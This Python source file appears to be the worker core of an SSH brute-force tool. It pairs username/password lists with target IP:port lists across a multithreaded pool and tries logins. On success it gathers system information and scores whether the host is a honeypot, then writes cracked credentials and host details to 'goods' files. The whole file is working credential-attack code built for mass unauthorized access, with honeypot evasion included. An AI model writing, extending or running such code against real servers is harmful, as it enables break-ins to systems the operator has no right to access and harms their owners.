# -*- UTF-8 -*-
# core/worker.py

import time
import queue
import threading
import concurrent.futures
import signal
from typing import Iterable, List, Tuple, Union
from pathlib import Path

from ui.banner import BannerStat
from ui.decorators import MsgDCR
from ui.table import Table
from core.config import (
    BRUTE_FORCE_STOP_EVENT,
    STATS, 
    globalConfig,
    DEFAULT_PATH
)
from core.recon import Recon
from core.honeypot import HoneypotEngine
from core.ssh_client import SSH_CONNECT
from core.models import ServerInfo, HoneypotDetector, SSHTask
from utils.io_utils import IO
from cli.signals import handle_SIGINT

class WorkerPipeline:
    def __init__(self, total_tasks: int,
                 timeout: int = globalConfig.TIMEOUT_SECS, 
                 max_workers: int = globalConfig.MAX_WORKERS,
                 per_worker: int = globalConfig.CONCURRENT_PER_WORKER,
                 log_file: str = DEFAULT_PATH.DEBUG_FILE,
                 success_file: str = DEFAULT_PATH.GOODS_FILE,
                 success_detailed_file: str = DEFAULT_PATH.GOODS_DETAILED_FILE_PATH,
                 honeypot_file: str = DEFAULT_PATH.HONEYPOTS_FILE
                 ):
        self.total_tasks = total_tasks
        self.timeout = timeout
        self.max_workers = max_workers
        self.per_worker = per_worker
        self.log_file = log_file
        self.success_file = success_file
        self.success_detailed_file = success_detailed_file
        self.honeypot_file = honeypot_file
        self.io = IO()
        self.recon = Recon()
        self.honeypot_engine = HoneypotEngine()
        self.task_q: "queue.Queue[SSHTask]" = queue.Queue(
            max(1, self.calculate_optimal_buffer()))
        
        
    def _process_wrapper(self, task: SSHTask, semaphore: threading.Semaphore) -> None:
        try:
            self.process_task(task)
        finally:
            semaphore.release()
    def run(self, combos: List[Tuple[str, str]], targets: List[Tuple[str, str]]) -> None:
        if not self.total_tasks:
            try:
                self.total_tasks = len(combos) * len(targets)
            except Exception:
                self.total_tasks = 0

        if self.total_tasks == 0:
            MsgDCR.FailureMessage("No tasks to run. Check your files.")
            return

        globalConfig.START_TIME_MONOTONIC = time.perf_counter()

        # Live stats/banner thread
        banner_tasks = BannerStat(self.total_tasks)

        banner = threading.Thread(
            target=banner_tasks.run, daemon=True)
        banner.start()

        # Producer fills queue with SSHTask instances
        def producer() -> None:
            try:
                for task in self.generate_tasks(combos, targets):
                    if BRUTE_FORCE_STOP_EVENT.is_set():
                        break
                    self.task_q.put(task)
            finally:
                # Send sentinel Nones to let workers finish
                for _ in range(self.max_workers):
                    self.task_q.put(None)  # type: ignore[arg-type]

        prod_t = threading.Thread(target=producer, daemon=True)
        prod_t.start()

        # Launch outer workers and wait for completion
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            worker_futures = [pool.submit(self.worker_main, i)
                              for i in range(self.max_workers)]
            prod_t.join()
            concurrent.futures.wait(worker_futures, timeout=None)

        # Signal banner to stop and give it a moment to exit
        BRUTE_FORCE_STOP_EVENT.set()
        banner.join(timeout=1.0)

    def worker_main(self, worker_id: int) -> None:
        semaphore = threading.BoundedSemaphore(
            self.per_worker)
        futures: List[concurrent.futures.Future[None]] = []
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.per_worker) as inner_pool:
            while True:
                if BRUTE_FORCE_STOP_EVENT.is_set():
                    break
                try:
                    task = self.task_q.get(timeout=0.2)
                except queue.Empty:
                    continue
                if task is None:
                    break
                semaphore.acquire()
                fut = inner_pool.submit(
                    self._process_wrapper, task, semaphore)
                futures.append(fut)
        # Ensure all inner futures complete
        concurrent.futures.wait(futures, timeout=None)

    def calculate_optimal_buffer(self) -> int:
        # Task Buffer = Workers × Concurrent_Per_Worker × 1.5 (safety factor)
        return int(self.max_workers * self.per_worker * 1.5)


    def generate_tasks(self, combos: Iterable[Tuple[str, str]], targets: Iterable[Tuple[str, str]]) -> Iterable[SSHTask]:
        for u, p in combos:
            for ip, port in targets:
                yield SSHTask(ip=ip, port=port, username=u, password=p)
    
    def process_task(self, task: SSHTask) -> None:
        """Process a single SSH task with safe logging and stats updates."""
        self.io.file_append(
            self.log_file,
            f"[TRYING] {task.ip}:{task.port}@{task.username}:{task.password}\n",
        )

        t0 = time.perf_counter()
        try:
            with SSH_CONNECT(hostname=task.ip,
                             port=int(task.port), 
                             username=task.username, 
                             password=task.password, 
                             timeout=self.timeout
                             ) as ssh:
                # try:
                #     ssh.connect_safe()
                # except Exception:
                #     with STATS.STATS_LOCK:
                #         STATS.ERRORS += 1
                #     return

                server = ServerInfo(
                    ip=task.ip,
                    port=task.port,
                    username=task.username,
                    password=task.password,
                )
                server.response_time_ms = (time.perf_counter() - t0) * 1000.0

                self.recon.gather_system_info(ssh, server)
                detector = HoneypotDetector()
                server.is_honeypot = self.honeypot_engine.detect(ssh, server, detector)

                key = f"{server.ip}:{server.port}"
                with STATS.SUCCESS_MAP_LOCK:
                    if key in STATS.SUCCESSFUL_IP_PORT:
                        return
                    STATS.SUCCESSFUL_IP_PORT.add(key)

                if not server.is_honeypot:
                    with STATS.STATS_LOCK:
                        STATS.GOODS += 1
                    self.io.file_append(
                        self.log_file,
                        f"[SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
                    )
                    self.log_success(server)
                else:
                    with STATS.STATS_LOCK:
                        STATS.HONEYPOTS += 1
                    self.io.file_append(
                        self.log_file,
                        f"[HONEYPOT SUCCESS] {server.ip}:{server.port}@{server.username}:{server.password}\n",
                    )
                    self.io.file_append(
                        DEFAULT_PATH.HONEYPOTS_FILE,
                        f"HONEYPOT: {server.ip}:{server.port}@{server.username}:{server.password} (Score: {server.honeypot_score})\n",
                    )
        except RuntimeError:
            with STATS.STATS_LOCK:
                STATS.ERRORS += 1
            self.io.file_append(
                self.log_file,
                f"[RUNTIME ERROR] {task.ip}:{task.port}@{task.username}:{task.password}\n",
            )
        except Exception as ex:
            with STATS.STATS_LOCK:
                STATS.ERRORS += 1
            self.io.file_append(
                self.log_file,
                f"[NOT CONNECTED] {task.ip}:{task.port}@{task.username}:{task.password} with error: {ex}\n",
            )

    def log_success(self, server: ServerInfo) -> None:
        simple = f"{server.ip}:{server.port}@{server.username}:{server.password}"
        self.io.file_append(self.success_file, simple + "\n")
        detailed_table = Table(block_padding=4)
        detailed_table.add_block(['SSH SUCCESS'])
        detailed_table.add_block([
            f'Target: {server.ip}:{server.port}',
            f'Credentials: {server.username}:{server.password}',
            f'Hostname: {server.hostname}',
            f'OS: {server.os_info}',
            f'SSH Version: {server.ssh_version}',
            f'Response Time: {server.response_time_ms:.2f} ms',
            f'Open Ports: {server.open_ports}',
            f'Honeypot Score: {server.honeypot_score}',
            f'Timestamp: {(time.strftime("%Y-%m-%d %H:%M:%S"))}'
        ])
        self.io.file_append(self.success_detailed_file,
                    detailed_table.display_plain() + '\n')
